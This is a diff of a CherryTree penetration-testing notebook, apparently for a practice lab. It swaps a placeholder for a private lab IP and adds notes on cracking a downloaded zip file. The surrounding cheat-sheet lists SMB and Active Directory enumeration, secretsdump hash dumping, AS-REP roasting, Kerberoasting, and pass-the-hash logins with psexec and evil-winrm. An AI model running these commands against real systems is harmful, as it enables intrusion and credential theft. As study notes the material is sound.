@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="10.11.1." unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1675519371">
-    <rich_text>IP :10.11.1.
+  <node name="192.168.249.85" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1675519371">
+    <rich_text>IP :192.168.249.85
 Hostname:
 OS:
 
@@ -17,7 +17,36 @@ Windows Proof: </rich_text>
     <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
     <rich_text>
 </rich_text>
-    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1676120787"/>
+    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1687726862">
+      <node name="nmap" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687726824" ts_lastsave="1687726845">
+        <rich_text>find two open ports 
+
+
+22 and 80</rich_text>
+      </node>
+      <node name="port 80" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687726862" ts_lastsave="1687727278">
+        <rich_text>we see a zip file on port 80
+we can download it then to crack it we will use zip2john
+
+
+cracking zip file and cracking the 
+
+we get the following
+
+
+ 
+as user and 
+password 
+
+
+
+</rich_text>
+        <codebox char_offset="123" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">/etc/shadow</codebox>
+        <codebox char_offset="149" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">296640a3b825115a47b68fc44501c828</codebox>
+        <codebox char_offset="176" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">server
+</codebox>
+      </node>
+    </node>
     <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
       <rich_text weight="heavy">Service Exploited:  
 Vulnerability Type:
@@ -1187,9 +1216,9 @@ echo ts.Close </rich_text>
 Set the </rich_text>
         <rich_text family="monospace">--insecuressl</rich_text>
         <rich_text> flag.</rich_text>
-        <codebox char_offset="38" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.11.1. -w /usr/share/wordlists/dirb/big.txt -t 20 -o gobuster.log</codebox>
-        <codebox char_offset="64" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.11.1. -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
-        <codebox char_offset="103" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.11.1. -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20 -o gobuster.log</codebox>
+        <codebox char_offset="38" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://192.168.249.85 -w /usr/share/wordlists/dirb/big.txt -t 20 -o gobuster.log</codebox>
+        <codebox char_offset="64" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://192.168.249.85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
+        <codebox char_offset="103" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://192.168.249.85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20 -o gobuster.log</codebox>
       </node>
       <node name="ssh" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684867617" ts_lastsave="1687291548">
         <rich_text scale="h2">SSH</rich_text>
@@ -1231,24 +1260,24 @@ run the following in case
         <rich_text foreground="#5ebdab">"UserKnownHostsFile=/dev/null"</rich_text>
         <rich_text> -o </rich_text>
         <rich_text foreground="#5ebdab">"StrictHostKeyChecking=no"</rich_text>
-        <rich_text> -i temp root@10.11.1.  -p 22
+        <rich_text> -i temp root@192.168.249.85  -p 22
 
 
 _____________________________________
 
 </rich_text>
-        <rich_text scale="h2">Port-Forwarding:</rich_text>
+        <rich_text scale="h2">Port-Forwardi</rich_text>
+        <rich_text justification="left" scale="h2"></rich_text>
+        <rich_text scale="h2">ng:</rich_text>
         <rich_text>
 
 
-</rich_text>
-        <rich_text justification="left"></rich_text>
-        <rich_text>  </rich_text>
-        <codebox char_offset="5" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@10.11.1. -p 22</codebox>
+  </rich_text>
+        <codebox char_offset="5" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@192.168.249.85 -p 22</codebox>
         <codebox char_offset="55" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh-keygen -t rsa -b 4096</codebox>
         <codebox char_offset="78" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ~/.ssh/authorized_keys</codebox>
         <codebox char_offset="108" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">chmod 600 ~/.ssh/authorized_keys</codebox>
-        <codebox char_offset="281" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -L 8000:127.0.0.1:8000 sau@10.11.1.</codebox>
+        <codebox char_offset="281" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -L 8000:127.0.0.1:8000 sau@192.168.249.85</codebox>
       </node>
       <node name="nikto" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687617619" ts_lastsave="1687617725">
         <rich_text scale="h2">Usage
@@ -1265,8 +1294,8 @@ _____________________________________
 
 </rich_text>
         <rich_text justification="left"></rich_text>
-        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.11.1. -output niktooutput.log</codebox>
-        <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.11.1. -port [port number 1], [port number 2], [port number 3]</codebox>
+        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 192.168.249.85 -output niktooutput.log</codebox>
+        <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 192.168.249.85 -port [port number 1], [port number 2], [port number 3]</codebox>
       </node>
       <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1687690153">
         <rich_text scale="h1">Nmap</rich_text>
@@ -1329,13 +1358,13 @@ Also check
         <rich_text link="node 41">CrackMapExec</rich_text>
         <rich_text>
 </rich_text>
-        <codebox char_offset="27" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script smb-enum-shares -p 139,445 10.11.1.</codebox>
-        <codebox char_offset="42" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script=smb-vuln* --script-args=unsafe=1 -T5 10.11.1.</codebox>
-        <codebox char_offset="104" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.11.1.</codebox>
-        <codebox char_offset="128" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.11.1. -u &lt;user&gt; -p &lt;pass&gt;</codebox>
-        <codebox char_offset="178" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -r DirectoryName -H 10.11.1.</codebox>
-        <codebox char_offset="242" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 10.11.1.</codebox>
-        <codebox char_offset="249" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 10.11.1.</codebox>
+        <codebox char_offset="27" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script smb-enum-shares -p 139,445 192.168.249.85</codebox>
+        <codebox char_offset="42" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script=smb-vuln* --script-args=unsafe=1 -T5 192.168.249.85</codebox>
+        <codebox char_offset="104" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 192.168.249.85</codebox>
+        <codebox char_offset="128" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 192.168.249.85 -u &lt;user&gt; -p &lt;pass&gt;</codebox>
+        <codebox char_offset="178" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -r DirectoryName -H 192.168.249.85</codebox>
+        <codebox char_offset="242" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 192.168.249.85</codebox>
+        <codebox char_offset="249" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 192.168.249.85</codebox>
       </node>
       <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1687690428">
         <rich_text>
@@ -1385,7 +1414,7 @@ impacket-GetNPUsers spookysec.local/svc-admin -no-pass
 
 or
 
-python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pass -dc-ip 10.11.1.
+python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pass -dc-ip 192.168.249.85
 </codebox>
           </node>
           <node name="secretdumps-GetAllHashes" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690752">
@@ -1402,7 +1431,7 @@ python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pas
 </rich_text>
             <codebox char_offset="83" justification="left" frame_width="850" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -just-dc backup@spookysec.local
 or 
-impacket-secretsdump domain.local/user@10.11.1.</codebox>
+impacket-secretsdump domain.local/user@192.168.249.85</codebox>
           </node>
           <node name="psexec - Passthe HAsh" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690770">
             <rich_text>Exploitation via pass the hash
@@ -1430,10 +1459,10 @@ or
 
 
 </rich_text>
-            <codebox char_offset="34" justification="left" frame_width="1314" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.11.1. -hashes randomLMHASH:oeasdNTLMHASH
+            <codebox char_offset="34" justification="left" frame_width="1314" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@192.168.249.85 -hashes randomLMHASH:oeasdNTLMHASH
 </codebox>
-            <codebox char_offset="41" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo python2 psexec.py /administrator:Password123@10.11.1. </codebox>
-            <codebox char_offset="49" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /administrator:Password123@10.11.1.</codebox>
+            <codebox char_offset="41" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo python2 psexec.py /administrator:Password123@192.168.249.85 </codebox>
+            <codebox char_offset="49" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /administrator:Password123@192.168.249.85</codebox>
           </node>
           <node name="GetADUsers-enumerating Data from users" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690774">
             <rich_text>
@@ -1458,7 +1487,7 @@ or
             <codebox char_offset="104" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">GetADUsers.py domain/user:password@IP
 or
 impacket-GetADUsers domain/user:password@IP</codebox>
-            <codebox char_offset="114" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GETADUsers -all domain.local/user -dc-ip 10.11.1.</codebox>
+            <codebox char_offset="114" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GETADUsers -all domain.local/user -dc-ip 192.168.249.85</codebox>
           </node>
           <node name="GetUserSPNs - get TGTs" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690781">
             <rich_text>
@@ -1468,7 +1497,7 @@ impacket-GetADUsers domain/user:password@IP</codebox>
 
 </rich_text>
             <rich_text justification="left"></rich_text>
-            <codebox char_offset="35" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 10.11.1. domain.local/user</codebox>
+            <codebox char_offset="35" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 192.168.249.85 domain.local/user</codebox>
           </node>
         </node>
         <node name="Pass The Hash Attack" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689619" ts_lastsave="1687690728">
@@ -1486,8 +1515,8 @@ or
           <rich_text>
 
 </rich_text>
-          <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.11.1. -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</codebox>
-          <codebox char_offset="10" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.11.1. -hashes randomLMHASH:oeasdNTLMHASH</codebox>
+          <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 192.168.249.85 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</codebox>
+          <codebox char_offset="10" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@192.168.249.85 -hashes randomLMHASH:oeasdNTLMHASH</codebox>
           <codebox char_offset="11" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
         </node>
         <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1687690347">
@@ -1632,24 +1661,24 @@ runas /netonly /user:domain.local\user cmd
  
 </rich_text>
           <rich_text justification="left"></rich_text>
-          <codebox char_offset="34" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1.</codebox>
-          <codebox char_offset="88" justification="left" frame_width="962" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. -u &lt;username&gt; -p &lt;password&gt; --shares
+          <codebox char_offset="34" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.249.85</codebox>
+          <codebox char_offset="88" justification="left" frame_width="962" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.249.85 -u &lt;username&gt; -p &lt;password&gt; --shares
 
 Ex:
 
-crackmapexec smb 10.11.1. -u admin -p abcd1234 --shares</codebox>
-          <codebox char_offset="120" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. -u admin -H reallybighashvalue</codebox>
-          <codebox char_offset="150" justification="left" frame_width="610" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> crackmapexec smb 10.11.1. --shares
+crackmapexec smb 192.168.249.85 -u admin -p abcd1234 --shares</codebox>
+          <codebox char_offset="120" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.249.85 -u admin -H reallybighashvalue</codebox>
+          <codebox char_offset="150" justification="left" frame_width="610" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> crackmapexec smb 192.168.249.85 --shares
  </codebox>
-          <codebox char_offset="190" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. --shares -u '' -p ''</codebox>
-          <codebox char_offset="230" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. --shares -u 'randomanon' -p ''</codebox>
-          <codebox char_offset="238" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. -u admin -H reallybighashvalue</codebox>
+          <codebox char_offset="190" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.249.85 --shares -u '' -p ''</codebox>
+          <codebox char_offset="230" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.249.85 --shares -u 'randomanon' -p ''</codebox>
+          <codebox char_offset="238" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.249.85 -u admin -H reallybighashvalue</codebox>
           <codebox char_offset="263" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Crackmapexec -d domain.local -u username -p password --shares</codebox>
           <codebox char_offset="264" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
 </codebox>
-          <codebox char_offset="307" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. -U validuser.txt -P password.txt -M spider-plus </codebox>
+          <codebox char_offset="307" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.249.85 -U validuser.txt -P password.txt -M spider-plus </codebox>
           <codebox char_offset="308" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
-          <codebox char_offset="405" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">  crackmapexec smb 10.11.1.  -U validuser.txt -P password.txt -M spider-plus --no-bruteforce</codebox>
+          <codebox char_offset="405" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">  crackmapexec smb 192.168.249.85  -U validuser.txt -P password.txt -M spider-plus --no-bruteforce</codebox>
         </node>
         <node name="Using Bloodhound" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690408" ts_lastsave="1687725851">
           <rich_text scale="h3">Upload sharphound and run the following if u are on a non domain joined system in powershell</rich_text>
@@ -1716,12 +1745,12 @@ where </rich_text>
 
 
 where -c is for collection all</rich_text>
-          <codebox char_offset="94" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe -c all -d domain.local --domaincontroller 10.11.1.</codebox>
+          <codebox char_offset="94" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe -c all -d domain.local --domaincontroller 192.168.249.85</codebox>
           <codebox char_offset="127" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe</codebox>
           <codebox char_offset="599" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo apt install bloodhound.py</codebox>
-          <codebox char_offset="608" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">python3 bloodhound.py --dns-tcp -ns 10.11.1. -d support.htb -u ‘ldap’ -p ‘password’</codebox>
-          <codebox char_offset="616" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.11.1. -d support.htb -u ‘ldap’ -p ‘password’</codebox>
-          <codebox char_offset="681" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.11.1. -d support.htb -u ‘ldap’ -p ‘password’ -c all</codebox>
+          <codebox char_offset="608" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">python3 bloodhound.py --dns-tcp -ns 192.168.249.85 -d support.htb -u ‘ldap’ -p ‘password’</codebox>
+          <codebox char_offset="616" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 192.168.249.85 -d support.htb -u ‘ldap’ -p ‘password’</codebox>
+          <codebox char_offset="681" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 192.168.249.85 -d support.htb -u ‘ldap’ -p ‘password’ -c all</codebox>
         </node>
         <node name="ldapsearch" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690428" ts_lastsave="1687690429">
           <rich_text scale="h3">Using Ldapsearch</rich_text>
@@ -1736,17 +1765,17 @@ where -c is for collection all</rich_text>
         <rich_text underline="single" weight="heavy">Network Scanning</rich_text>
         <rich_text>
 
-   ☐  nmap -sn 10.11.1.
-   ☐  nmap -sL 10.11.1.
-   ☐  nbtscan -r 10.11.1.
+   ☐  nmap -sn 192.168.249.85
+   ☐  nmap -sL 192.168.249.85
+   ☐  nbtscan -r 192.168.249.85
 
 </rich_text>
         <rich_text underline="single" weight="heavy">Individual Host Scanning</rich_text>
         <rich_text>
 
    ☐  nmap  --top-ports 20 --open -iL iplist.txt
-   ☐  nmap -sS -A -sV -O -p- 10.11.1.
-   ☐  nmap -sU 10.11.1.
+   ☐  nmap -sS -A -sV -O -p- 192.168.249.85
+   ☐  nmap -sU 192.168.249.85
 </rich_text>
       </node>
       <node name="FTP" unique_id="37" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687687069" ts_lastsave="1687687497">
@@ -1771,9 +1800,9 @@ Connecting:
 
 </rich_text>
         <rich_text justification="left"></rich_text>
-        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> nmap -Pn -n -vvv -p21 -sC -sV 10.11.1.</codebox>
-        <codebox char_offset="35" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wget -r 'ftp://&lt;username&gt;:&lt;password&gt;@10.11.1.'</codebox>
-        <codebox char_offset="52" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ftp -A 10.11.1.</codebox>
+        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> nmap -Pn -n -vvv -p21 -sC -sV 192.168.249.85</codebox>
+        <codebox char_offset="35" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wget -r 'ftp://&lt;username&gt;:&lt;password&gt;@192.168.249.85'</codebox>
+        <codebox char_offset="52" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ftp -A 192.168.249.85</codebox>
       </node>
       <node name="PrivEsc" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689966" ts_lastsave="1687689975">
         <node name="Linux" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689975" ts_lastsave="1687689978">
